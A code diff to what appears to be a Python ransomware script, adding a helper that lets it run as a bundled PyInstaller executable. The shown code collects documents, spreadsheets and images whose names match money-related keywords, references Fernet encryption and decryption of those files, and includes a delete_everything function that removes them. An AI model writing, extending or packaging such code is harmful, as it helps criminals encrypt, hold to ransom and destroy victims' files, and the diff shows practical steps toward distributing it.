@@ -1,11 +1,12 @@
 import os
+import sys
 from cryptography.fernet import Fernet
 
 #Creates a list of files of certain extensions within the given folder, whose file names include keywords from the 'MoneyWords.txt' file in any form
 def generate_file_list_keyword(path):
     encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg','.xlsx')
     file_paths = []
-    rfile = open('MoneyWords.txt', 'r')
+    rfile = open(get_path('MoneyWords.txt'), 'r')
     words = [line[:-1] for line in rfile]
     for root, dirs, files, in os.walk(path):
         for file in files:
@@ -68,3 +69,11 @@ def decrypt_files(file_paths, fernet):
 def delete_everything(file_paths):
     for f in file_paths:
         os.remove(f)
+
+def get_path(filename):
+    if hasattr(sys, "_MEIPASS"):
+        return os.path.join(sys._MEIPASS, filename)
+    else:
+        return filename
+
+
